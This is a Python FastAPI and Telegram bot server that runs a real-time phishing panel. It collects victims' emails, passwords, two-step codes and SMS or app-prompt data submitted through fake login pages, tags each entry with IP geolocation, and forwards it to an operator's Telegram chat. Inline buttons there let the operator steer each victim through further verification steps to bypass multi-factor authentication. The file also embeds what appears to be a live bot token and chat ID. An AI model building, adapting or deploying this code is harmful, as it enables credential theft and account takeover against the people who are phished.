from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.exception_handlers import http_exception_handler
import sqlite3
import uuid
import asyncio
import os
from datetime import datetime
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters
from telegram.request import HTTPXRequest
from telegram.error import RetryAfter
from dotenv import load_dotenv
import uvicorn
import logging
from cachetools import TTLCache
import json
import re
import requests
import itertools

# === LOGGING / ENV / CORS ===
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
load_dotenv()

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Global deploy ready
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Global shield
async def custom_exception_handler(request: Request, exc: Exception):
    logger.error(f"Unhandled exception caught: {exc}")
    return JSONResponse({"error": "Server busy"}, status_code=500)

app.add_exception_handler(Exception, custom_exception_handler)

# === TELEGRAM BEAST MODE ===
request = HTTPXRequest(connection_pool_size=200, pool_timeout=300, read_timeout=90, connect_timeout=90)
bot = Bot(token=os.getenv("8710027685:AAFoqSlQHNNXE07mH02GIxkzPPDnIixGnnk"), request=request)
CHAT_ID = int(os.getenv("-5172853503"))  # Make sure it's int

send_queue = asyncio.PriorityQueue()
counter = itertools.count()

rate_semaphore = asyncio.Semaphore(30)

async def telegram_worker():
    while True:
        priority, seq, msg, markup, chat_id, reply_to = await send_queue.get()
        attempt = 0
        while True:
            try:
                async with rate_semaphore:
                    await bot.send_message(
                        chat_id=chat_id,
                        text=msg,
                        reply_markup=markup,
                        parse_mode="HTML",
                        reply_to_message_id=reply_to
                    )
                break
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after + min(60, 2 ** attempt))
                attempt += 1
            except Exception as e:
                await asyncio.sleep(min(60, 2 ** attempt))
                attempt += 1
        send_queue.task_done()

async def send_priority(priority: int, msg: str, markup=None, reply_to=None):
    await send_queue.put((priority, next(counter), msg, markup, CHAT_ID, reply_to))

# === DATABASE & CACHE ===
db_conn = sqlite3.connect("database.db", check_same_thread=False, timeout=60.0)
cursor = db_conn.cursor()
cursor.execute("PRAGMA journal_mode=WAL;")
cursor.execute("PRAGMA busy_timeout=30000;")
db_conn.commit()

cursor.execute("""
CREATE TABLE IF NOT EXISTS sessions (
    id TEXT PRIMARY KEY,
    ip TEXT,
    inputs_json TEXT,
    auth_type TEXT,
    status TEXT,
    verification_number TEXT,
    phone_last_digit TEXT,
    last_activity TEXT,
    current_page TEXT,
    inactive_sent INTEGER DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
""")

cols = {c[1] for c in cursor.execute("PRAGMA table_info(sessions)").fetchall()}
for col in ['verification_number', 'phone_last_digit', 'last_activity', 'current_page', 'inactive_sent']:
    if col not in cols:
        dtype = 'INTEGER DEFAULT 0' if col == 'inactive_sent' else 'TEXT'
        cursor.execute(f"ALTER TABLE sessions ADD COLUMN {col} {dtype}")
db_conn.commit()

sessions = TTLCache(maxsize=5_000_000, ttl=86400 * 7)

def get_session(session_id: str):
    if session_id in sessions:
        return sessions[session_id]
    cursor.execute("""
        SELECT ip, inputs_json, auth_type, status, verification_number, phone_last_digit, last_activity, current_page, inactive_sent, created_at 
        FROM sessions WHERE id = ?
    """, (session_id,))
    row = cursor.fetchone()
    if row:
        data = {
            'ip': row[0],
            'inputs': json.loads(row[1]),
            'auth_type': row[2],
            'status': row[3],
            'verification_number': row[4],
            'phone_last_digit': row[5],
            'last_activity': row[6],
            'current_page': row[7],
            'inactive_sent': row[8],
            'created_at': row[9]
        }
        sessions[session_id] = data
        return data
    return None

async def save_session_with_retry(session_id: str, data: dict):
    attempt = 0
    while True:
        try:
            prev = get_session(session_id) or {}
            full_inputs = {**prev.get('inputs', {}), **data.get('inputs', {})}
            full_data = {**prev, **data, 'inputs': full_inputs}
            cursor.execute("""
                INSERT OR REPLACE INTO sessions 
                (id, ip, inputs_json, auth_type, status, verification_number, phone_last_digit, last_activity, current_page, inactive_sent)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                session_id,
                full_data.get('ip'),
                json.dumps(full_inputs),
                full_data.get('auth_type', ''),
                full_data.get('status', 'pending'),
                full_data.get('verification_number', ''),
                full_data.get('phone_last_digit', ''),
                full_data.get('last_activity', ''),
                full_data.get('current_page', ''),
                full_data.get('inactive_sent', 0)
            ))
            db_conn.commit()
            sessions[session_id] = full_data
            return
        except Exception as e:
            await asyncio.sleep(min(60, 2 ** attempt))
            attempt += 1

async def prune_old_sessions():
    while True:
        await asyncio.sleep(1800)
        try:
            cursor.execute("DELETE FROM sessions WHERE created_at < DATETIME('now', '-24 hours')")
            db_conn.commit()
            sessions.clear()
            logger.info("Old sessions pruned")
        except Exception as e:
            logger.error(f"Prune error: {e}")

def map_page_to_form(page):
    return {
        'email': 'Email', 'password': 'Password', 'twostep': 'TwoStepCode',
        'app': 'AppPrompt', 'sms': 'SmsVerify', 'phone': 'PhoneConfirm', 'thankyou': 'ThankYou'
    }.get(page, page.title())

# === SUBMIT PAGE ===
@app.post("/api/{page}")
async def submit_page(page: str, request: Request):
    try:
        data = await request.json()
        ip = request.client.host

        if not isinstance(data, dict) or not isinstance(data.get('inputs', {}), dict):
            raise ValueError("Invalid data")

        if page == 'schedule':
            session_id = str(uuid.uuid4())
        else:
            session_id = data.get('session_id')
            if not session_id or not get_session(session_id):
                raise HTTPException(400, "Invalid session")

        # Geo
        country = city = 'Unknown'
        try:
            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=15).json()
            country = geo.get('country', 'Unknown')
            city = geo.get('city', 'Unknown')
        except:
            pass

        # <<< THIS IS THE FIX >>>
        await save_session_with_retry(session_id, {
            'ip': ip,
            'inputs': data.get('inputs', {}),
            'last_page': page,
            'last_activity': datetime.now().isoformat(),
            'current_page': page,
            'inactive_sent': 0,
            'status': 'pending'  # ← FORCED RESET EVERY SUBMIT
        })

        sess = get_session(session_id)
        email = sess['inputs'].get('email', sess['inputs'].get('businessEmail', 'Unknown'))
        active = f"🟢 ACTIVE: in {map_page_to_form(page)} form"

        if page == 'schedule':
            msg = "🚨 LOGIN GOOGLE CLICKED."
            await send_priority(5, msg, None)
        else:
            # Build message + keyboard
            kb_rows = []
            kb_rows.append([InlineKeyboardButton(f"❌ Wrong {page.title()}", callback_data=f'wrong:{session_id}')])
            kb_rows.append([InlineKeyboardButton("✅ Thank You", callback_data=f'redirect:{session_id}')])
            row = []
            icons = {'email': '📩', 'password': '🤫', 'twostep': '🔒', 'app': '🛡️', 'sms': '📱', 'phone': '📲', 'schedule': '🔄'}
            for p in ['email', 'password', 'twostep', 'app', 'sms', 'phone', 'schedule']:
                row.append(InlineKeyboardButton(f"{icons[p]} {p.title()}", callback_data=f'{p}:{session_id}'))
                if len(row) == 3:
                    kb_rows.append(row)
                    row = []
            if row:
                kb_rows.append(row)

            # Message content
            if page in ['email', 'password', 'phone', 'sms', 'twostep']:
                key = list(data['inputs'].keys())[0]
                val = data['inputs'][key]
                msg = f"🆕 {key.upper()} for {email}\n{key.upper()}: <code>{val}</code>\nCountry: {country}\nCity: {city}\nIP: <code>{ip}</code>\n{active}"
            else:
                lines = [f"<b>{page.upper()} for {email}</b>"]
                for k, v in data['inputs'].items():
                    lines.append(f"{k.upper()}: <code>{v}</code>")
                lines.extend([f"Country: {country}", f"City: {city}", f"IP: <code>{ip}</code>", active])
                msg = "\n".join(lines)

            await send_priority(10, msg, InlineKeyboardMarkup(kb_rows))

        return {"session_id": session_id}

    except Exception as e:
        logger.error(f"Submit error {page}: {e}")
        return JSONResponse({"error": "Server error"}, status_code=500)

# === RESEND — INSTANT ===
@app.post("/api/resend/{page}")
async def resend_page(page: str, request: Request):
    try:
        data = await request.json()
        session_id = data.get('session_id')
        sess = get_session(session_id)
        if not sess:
            return {"status": "no_session"}

        await save_session_with_retry(session_id, {'status': 'pending'})  

        email = sess['inputs'].get('email') or sess['inputs'].get('businessEmail', 'Unknown')
        msg = f"🔄 RESEND pressed on {page.upper()}\nEMAIL: <code>{email}</code>\nSession: <code>{session_id}</code>"

        kb_rows = []
        kb_rows.append([InlineKeyboardButton(f"❌ Wrong {page.title()}", callback_data=f'wrong:{session_id}')])
        kb_rows.append([InlineKeyboardButton("✅ Thank You", callback_data=f'redirect:{session_id}')])
        row = []
        icons = {'email': '📩', 'password': '🤫', 'twostep': '🔒', 'app': '🛡️', 'sms': '📱', 'phone': '📲', 'schedule': '🔄'}
        for p in ['email', 'password', 'twostep', 'app', 'sms', 'phone', 'schedule']:
            row.append(InlineKeyboardButton(f"{icons[p]} {p.title()}", callback_data=f'{p}:{session_id}'))
            if len(row) == 3:
                kb_rows.append(row)
                row = []
        if row:
            kb_rows.append(row)

        await send_priority(0, msg, InlineKeyboardMarkup(kb_rows))  # INSTANT
        return {"status": "sent"}
    except Exception as e:
        logger.error(f"Resend error: {e}")
        return {"status": "error"}

# === POLL ===
@app.get("/check_response/{session_id}")
async def check_response(session_id: str, current_page: str = None):
    sess = get_session(session_id)
    if not sess:
        return {"message": "No session."}

    update_data = {'last_activity': datetime.now().isoformat()}
    if current_page:
        update_data['current_page'] = current_page
    await save_session_with_retry(session_id, update_data)

    if sess.get('status') == 'approved' and sess.get('auth_type'):
        resp = {"authType": sess['auth_type'], "email": sess['inputs'].get('email') or sess['inputs'].get('businessEmail', '')}
        if sess['auth_type'] == 'app':
            resp["verificationNumber"] = sess.get('verification_number', '')
        if sess['auth_type'] == 'sms':
            resp["phoneLastDigit"] = sess.get('phone_last_digit', '')
        return resp

    if sess.get('status') == 'error':
        return {"error": "Wrong data. Try again.", "page": sess.get('auth_type', '')}

    return {"message": "Waiting for approval..."}

# === CALLBACK & TEXT HANDLERS ===
async def handle_callback(update, context):
    query = update.callback_query
    await query.answer()
    if ':' not in query.data: return
    action, sess_id = query.data.split(':', 1)
    sess = get_session(sess_id)
    if not sess:
        await send_priority(0, "Session dead")
        return

    username = sess['inputs'].get('email') or sess['inputs'].get('businessEmail', 'Unknown')
    msg_id = query.message.message_id

    if action == 'wrong':
        await save_session_with_retry(sess_id, {'status': 'error', 'auth_type': sess.get('last_page')})
        await send_priority(5, f"❌ Wrong executed → {username}")
    elif action == 'redirect':
        await save_session_with_retry(sess_id, {'status': 'approved', 'auth_type': 'thankyou'})
        await send_priority(5, f"✅ Thank You sent → {username}")
    elif action == 'app':
        await send_priority(0, f"Enter verification number for {username} (Session: {sess_id}):", ForceReply(), reply_to=msg_id)
    elif action == 'sms':
        await send_priority(0, f"Enter phone last digit for {username} (Session: {sess_id}):", ForceReply(), reply_to=msg_id)
    elif action == 'schedule':
        cursor.execute("DELETE FROM sessions WHERE id = ?", (sess_id,))
        db_conn.commit()
        sessions.pop(sess_id, None)
        await send_priority(5, "🧹 Session CLEARED")
    else:
        await save_session_with_retry(sess_id, {'status': 'approved', 'auth_type': action})
        await send_priority(5, f"Redirect → {action.title()} → {username}")

async def handle_text_input(update, context):
    msg = update.message
    if not msg.reply_to_message: return
    reply_text = msg.reply_to_message.text or ""
    m = re.search(r'Session: ([\w-]+)', reply_text)
    if not m: return
    sess_id = m.group(1)
    val = msg.text.strip()
    sess = get_session(sess_id)
    if not sess: return
    username = sess['inputs'].get('email') or sess['inputs'].get('businessEmail', 'Unknown')

    if "verification number" in reply_text.lower():
        if not val.isdigit(): 
            await msg.reply_text("Digits only")
            return
        await save_session_with_retry(sess_id, {'verification_number': val, 'status': 'approved', 'auth_type': 'app'})
        await msg.reply_text(f"✅ App code {val} approved")
        await send_priority(5, f"App code {val} approved → {username}")
    elif "phone last digit" in reply_text.lower():
        if not (val.isdigit() and len(val)==1):
            await msg.reply_text("Single digit")
            return
        await save_session_with_retry(sess_id, {'phone_last_digit': val, 'status': 'approved', 'auth_type': 'sms'})
        await msg.reply_text(f"✅ Phone digit {val} approved")
        await send_priority(5, f"Phone digit {val} approved → {username}")

# === STARTUP ===
async def startup():
    application = Application.builder().token(os.getenv("8710027685:AAFoqSlQHNNXE07mH02GIxkzPPDnIixGnnk")).request(request).build()
    application.add_handler(CallbackQueryHandler(handle_callback))
    application.add_handler(MessageHandler(filters.REPLY & filters.TEXT & ~filters.COMMAND, handle_text_input))

    # 25 immortal workers
    for _ in range(25):
        asyncio.create_task(telegram_worker())

    asyncio.create_task(prune_old_sessions())

    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)

    config = uvicorn.Config(app=app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)), log_level="info", workers=4)
    server = uvicorn.Server(config)
    await server.serve()

if __name__ == "__main__":
    asyncio.run(startup())